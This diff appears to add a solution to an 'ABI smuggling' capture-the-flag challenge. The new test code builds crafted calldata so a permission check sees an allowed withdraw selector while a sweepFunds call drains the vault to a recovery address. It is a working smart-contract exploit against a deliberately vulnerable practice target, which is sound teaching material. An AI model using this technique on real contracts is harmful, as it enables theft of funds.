@@ -45,6 +45,37 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ZERO_PAD = ethers.utils.zeroPad(0, 32);
+        const executeFunctionSig = ethers.utils.solidityPack(["bytes4"], ["0x1cff79cd"]);
+        const withdrawFunctionSig = ethers.utils.defaultAbiCoder.encode(["bytes4"], ["0xd9caed12"]);
+        const vaultAddress = ethers.utils.defaultAbiCoder.encode(["address"], [vault.address]);
+        const actionDataOffset = ethers.utils.defaultAbiCoder.encode(["uint256"], [128]);
+        const actionDataLength = ethers.utils.defaultAbiCoder.encode(["uint256"], [68]);
+        const actionData = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+        const data = ethers.utils.solidityPack(["bytes4", "bytes32", "bytes32", "bytes32", "bytes32", "uint256", "bytes"], 
+        [
+            executeFunctionSig, 
+            vaultAddress, 
+            actionDataOffset, 
+            ZERO_PAD, 
+            withdrawFunctionSig, 
+            actionDataLength, 
+            actionData
+        ]);
+
+        const nonce = await ethers.provider.getTransactionCount(player.address);
+        const gasPrice = await ethers.provider.getGasPrice();
+
+        const tx = {
+            nonce,
+            gasPrice,
+            gasLimit: '300000',
+            to: vault.address,
+            value: 0,
+            data
+          };
+          
+        await player.sendTransaction(tx);
     });
 
     after(async function () {
